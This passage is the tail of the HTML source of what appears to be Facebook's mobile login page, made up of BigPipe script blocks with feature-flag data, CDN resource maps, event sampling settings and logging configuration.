                                "1942319": { r: 1, s: 1 },
                                "1842512": { r: 1 },
                                "1829319": { r: 1 },
                                "1829320": { r: 1 },
                                "1843988": { r: 1 },
                                "1848815": { r: 10000, s: 1 },
                                "1949898": { r: 1 },
                                "1765264": { r: 1, s: 1 },
                            },
                            gkxData: {
                                "2772": { result: false, hash: "AT5Eu244WIce7iwqg-o" },
                                "3752": { result: false, hash: "AT6eS5UTkkMp_xbPW_0" },
                                "3820": { result: false, hash: "AT6sMf-XMjfPaRKvCyE" },
                                "3831": { result: false, hash: "AT4W23lQ0XxAZniMzjE" },
                                "3959": { result: true, hash: "AT5An4B4pPVNHiK8a6w" },
                                "4075": { result: false, hash: "AT4_ZQi0sTjSt-RxG4w" },
                                "676781": { result: false, hash: "AT4-DnA47xPbjtkwBX4" },
                                "676837": { result: false, hash: "AT4N8wBZA8ctCdHw-fk" },
                                "712819": { result: false, hash: "AT79nTpb4gT-yu86y5w" },
                                "1217157": { result: false, hash: "AT6B7YmllOsArnK6FnI" },
                                "1224637": { result: false, hash: "AT7JRluWxuwDm3Xzs0o" },
                                "1554827": { result: false, hash: "AT7zueGLhGo0cT5xJ94" },
                                "1738486": { result: false, hash: "AT4cX37oQco6DwhUfnE" },
                                "910664": { result: false, hash: "AT69YyFAmMObhORG0VA" },
                                "1511920": { result: true, hash: "AT6pY2ROWoYnl3_cVBk" },
                                "1059877": { result: false, hash: "AT53XV4TWT4lc3_mSug" },
                                "1167394": { result: false, hash: "AT7BpN-tlUPwbIIF6ow" },
                                "1070739": { result: false, hash: "AT5rKAR6NQAuoRaHwAA" },
                                "676811": { result: false, hash: "AT4zC0IqvJCbKsUewWs" },
                                "676812": { result: false, hash: "AT6FULe6g-qrrrQdAx0" },
                                "820050": { result: true, hash: "AT7bjlcFFlowDw-S1bQ" },
                                "985697": { result: false, hash: "AT6gOJD7fT0UjmgDSh8" },
                                "148": { result: false, hash: "AT5V6Me6WVwsRI3watw" },
                                "1994902": { result: false, hash: "AT7e2ODUd_zspuYFwcg" },
                                "2223": { result: false, hash: "AT4s3JaAt9nQ6ucmQug" },
                                "2341": { result: false, hash: "AT7nNd913_uqf_cRpgo" },
                                "726410": { result: true, hash: "AT7w-jbTa3ueodj3550" },
                                "862436": { result: true, hash: "AT7YsAcWL8-1WZrOEOg" },
                                "1099893": { result: false, hash: "AT5kly2LSZV_DKGR6vE" },
                                "3499": { result: false, hash: "AT5l5tI3kdeSuUxU-2Y" },
                            },
                            qexData: { "91": { r: null }, "123": { r: null }, "648": { r: null }, "649": { r: null }, "650": { r: null }, "651": { r: null } },
                            qplData: { "891": { r: 1 } },
                        },
                        hblp: {
                            consistency: { rev: 1004998278 },
                            rsrcMap: {
                                VvVFw8n: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz" },
                                "/Trsior": { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/gO7iX4qiza3.js?_nc_x=Ij3Wp8lg5Kz" },
                                "+CMpyF0": { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/KtYKSH9SYI9.js?_nc_x=Ij3Wp8lg5Kz" },
                                "7WOfono": { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/n03XGxfB38k.js?_nc_x=Ij3Wp8lg5Kz" },
                                "M5wMZg+": { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/fDyEk0qm2G_.js?_nc_x=Ij3Wp8lg5Kz" },
                                qwAZCkc: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3iQQp4/y2/l/en_GB/IPFXibTBn5v.js?_nc_x=Ij3Wp8lg5Kz" },
                                Tt4EEE4: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3ik6s4/yB/l/en_GB/Wc0Z59f9_O9.js?_nc_x=Ij3Wp8lg5Kz" },
                                FJqL2Al: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz" },
                                aUdeKFQ: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/Vy6KblcAv5l.js?_nc_x=Ij3Wp8lg5Kz" },
                                bJ922yg: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" },
                                aenETyi: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yo/r/X-f5a4YHACr.js?_nc_x=Ij3Wp8lg5Kz" },
                                CIUOPmQ: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3i3kA4/ye/l/en_GB/6OnEcV9wVFH.js?_nc_x=Ij3Wp8lg5Kz" },
                                IbK54wb: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/oeF0Mzm41Pk.js?_nc_x=Ij3Wp8lg5Kz" },
                                "pE8e/jE": { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3iLQG4/yo/l/en_GB/rVXTEXgLOs3.js?_nc_x=Ij3Wp8lg5Kz" },
                                S0kME6i: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/I1JkzPA09DK.js?_nc_x=Ij3Wp8lg5Kz" },
                                TUxV68S: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/AEurEMwqHIo.js?_nc_x=Ij3Wp8lg5Kz" },
                            },
                            compMap: {
                                QPLInspector: { r: ["VvVFw8n"], be: 1 },
                                ODS: { r: ["/Trsior"], be: 1 },
                                TransportSelectingClientSingleton: {
                                    r: ["+CMpyF0", "/Trsior"],
                                    rds: {
                                        m: ["ContextualConfig", "BladeRunnerClient", "DGWRequestStreamClient", "MqttLongPollingRunner", "BanzaiScuba_DEPRECATED", "FbtLogging", "IntlQtEventFalcoEvent"],
                                        r: ["BIIJdhz", "7WOfono", "M5wMZg+", "qwAZCkc", "Tt4EEE4", "FJqL2Al"],
                                    },
                                    be: 1,
                                },
                                RequestStreamCommonRequestStreamCommonTypes: { r: ["+CMpyF0"], be: 1 },
                                Cookie: { r: ["/Trsior"], rds: { m: ["BanzaiScuba_DEPRECATED"], r: ["BIIJdhz"] }, be: 1 },
                                WebSpeedInteractionsTypedLogger: { r: ["/Trsior", "TUxV68S", "FJqL2Al", "BIIJdhz"], rds: { m: ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"] }, be: 1 },
                                PerfXSharedFields: { r: ["/Trsior"], be: 1 },
                            },
                        },
                    },
                    allResources: ["0iX5FOK", "MoYpVB9", "/Trsior", "BIIJdhz", "uq5kEmb", "CPTlf3J", "aUdeKFQ", "bJ922yg", "aenETyi", "CIUOPmQ", "qwAZCkc", "IbK54wb", "pE8e/jE", "S0kME6i", "FJqL2Al"],
                });
            });
        </script>
        <script>
            requireLazy(["__bigPipe"], function (bigPipe) {
                bigPipe.setPageID("7059123521598540821-0");
            });
            CavalryLogger.setPageID("7059123521598540821-0");
        </script>
        <script nonce="hoLQyIrb">
            (function () {
                var n = now_inl();
                requireLazy(["__bigPipe"], function (bigPipe) {
                    bigPipe.beforePageletArrive("last_response", n);
                });
            })();
        </script>
        <script nonce="hoLQyIrb">
            requireLazy(["__bigPipe"], function (bigPipe) {
                bigPipe.onPageletArrive({
                    id: "last_response",
                    phase: 63,
                    last_in_phase: true,
                    the_end: true,
                    jsmods: {
                        define: [
                            ["IntlCurrentLocale", [], { code: "en_GB" }, 5954],
                            ["MRegTopDomainsConfig", [], { topEmailDomains: ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "icloud.com"] }, 4220],
                            ["USIDMetadata", [], { browser_id: "?", tab_id: "", page_id: "Pr6jmnl16cpe9", transition_id: 0, version: 6 }, 5888],
                            ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904],
                            ["BrowserPushPubKey", [], { appServerKey: "BIBn3E_rWTci8Xn6P9Xj3btShT85Wdtne0LtwNUyRQ5XjFNkuTq9j4MPAVLvAFhXrUU1A9UxyxBA7YIOjqDIDHI" }, 4806],
                            ["MTouchableSyntheticClickGK", [], { USE_SYNTHETIC_CLICK: true }, 368],
                            ["cr:686", [], { __rc: [null, "Aa1-ppuGgzAk7v6fTt3roReS73L6Nb2rKn9Rx6N_Vggtixs3ZYUqTotahCnGhZRUvcppkHjaoie8SZxYUtwSGjLP6Q"] }, -1],
                            ["cr:1069930", [], { __rc: [null, "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            ["cr:1083116", ["XAsyncRequest"], { __rc: ["XAsyncRequest", "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            ["cr:1083117", [], { __rc: [null, "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            ["cr:1984081", [], { __rc: [null, "Aa0Hf2hVVvX1d-idA5jqtC4qzDagxppc6RKxYbIlqkGQZwFRXft09uBzS6CbIuWn_zbvdP56BYBbTx86x8FnNScdN4cf"] }, -1],
                            ["cr:334", ["ghlTestUBTFacebook"], { __rc: ["ghlTestUBTFacebook", "Aa18GJ8c6l3dE2edfRj5ovbsBdiXIw6CdFIrpXNpgYkZAUEkzeVqJdx2QVK9vjlYcbP6vHr1kdbcyGKMs1-Yf6cRnw"] }, -1],
                            ["cr:1088657", [], { __rc: [null, "Aa0sg96hSQrjqWVqN5b3RZPJUHIoO-tnf36J3R28KEo_0e9Ex3pFQt5zQV48KFN7TdFcwq7F7RL1kp7rd-DUNHQ"] }, -1],
                            ["cr:1543261", [], { __rc: [null, "Aa0thBD8HTSzq7-vDIZecfTX1KeJtl8ucIhfiva-RSVWu0U8xznvrks2CZJOSByzvnTTqVQ0H6aayjVPQ1-7IfEi"] }, -1],
                            ["cr:708886", ["EventProfilerImpl"], { __rc: ["EventProfilerImpl", "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            ["cr:1094907", [], { __rc: [null, "Aa18MXuGHbDFXgzmJrC37EdiE9wynKIPefCOQ7JEHsz1AppPE-h8DPH820JR7BRIt6yQA2y7odPl34-F9MAAu98"] }, -1],
                            [
                                "EventConfig",
                                [],
                                {
                                    sampling: {
                                        bandwidth: 0,
                                        play: 0,
                                        playing: 0,
                                        progress: 0,
                                        pause: 0,
                                        ended: 0,
                                        seeked: 0,
                                        seeking: 0,
                                        waiting: 0,
                                        loadedmetadata: 0,
                                        canplay: 0,
                                        selectionchange: 0,
                                        change: 0,
                                        timeupdate: 0,
                                        adaptation: 0,
                                        focus: 0,
                                        blur: 0,
                                        load: 0,
                                        error: 0,
                                        message: 0,
                                        abort: 0,
                                        storage: 0,
                                        scroll: 200000,
                                        mousemove: 20000,
                                        mouseover: 10000,
                                        mouseout: 10000,
                                        mousewheel: 1,
                                        MSPointerMove: 10000,
                                        keydown: 0.1,
                                        click: 0.02,
                                        mouseup: 0.02,
                                        __100ms: 0.001,
                                        __default: 5000,
                                        __min: 100,
                                        __interactionDefault: 200,
                                        __eventDefault: 100000,
                                    },
                                    page_sampling_boost: 1,
                                    interaction_regexes: {},
                                    interaction_boost: {},
                                    event_types: {},
                                    manual_instrumentation: false,
                                    profile_eager_execution: false,
                                    disable_heuristic: true,
                                    disable_event_profiler: false,
                                },
                                1726,
                            ],
                            ["KillabyteProfilerConfig", [], { htmlProfilerModule: null, profilerModule: null, depTypes: { BL: "bl", NON_BL: "non-bl" } }, 1145],
                            [
                                "QuicklingConfig",
                                [],
                                {
                                    version: "1004998278;0;",
                                    sessionLength: 30,
                                    inactivePageRegex:
                                        "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                                    badRequestKeys: ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"],
                                    logRefreshOverhead: false,
                                },
                                60,
                            ],
                        ],
                        require: [
                            [
                                "BDClientSignalCollectionTrigger",
                                "startSignalCollection",
                                [],
                                [
                                    {
                                        sc:
                                            '{"t":1637128278,"c":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}',
                                        fds: 60,
                                        fda: 60,
                                        i: 60,
                                        sbs: 1,
                                        dbs: 100,
                                        bbs: 100,
                                        hbi: 60,
                                        rt: 262144,
                                        hbcbc: 2,
                                        hbvbc: 0,
                                        hbbi: 30,
                                        sid: -1,
                                        hbv: "1781045924036875499",
                                    },
                                ],
                            ],
                            ["NavigationMetrics", "setPage", [], [{ page: "XLoginController", page_type: "normal", page_uri: "https://m.facebook.com/login/", serverLID: "7059123521598540821-0" }]],
                            ["CavalryLoggerImpl", "startInstrumentation", [], []],
                            ["Artillery", "disable", [], []],
                            ["ServiceWorkerURLCleaner", "removeRedirectID", [], []],
                        ],
                    },
                    hsrp: {
                        hsdp: { clpData: { "1743095": { r: 1, s: 1 } }, gkxData: { "1652843": { result: false, hash: "AT6uh9NWRY4QEQoY0N4" } } },
                        hblp: {
                            consistency: { rev: 1004998278 },
                            rsrcMap: {
                                t1KEUNA: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/31Z8YEN6kEd.js?_nc_x=Ij3Wp8lg5Kz" },
                                FEt5GzN: { type: "js", src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz" },
                            },
                        },
                    },
                    allResources: ["t1KEUNA", "/Trsior", "FEt5GzN", "S0kME6i", "BIIJdhz"],
                    onload: ['CavalryLogger.getInstance("7059123521598540821-0").setTTIEvent("t_domcontent");'],
                    onafterload: ['window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_paint");', 'if (window.ExitTime){CavalryLogger.getInstance("7059123521598540821-0").setValue("t_exit", window.ExitTime);};'],
                });
            });
        </script>
    </body>
</html>
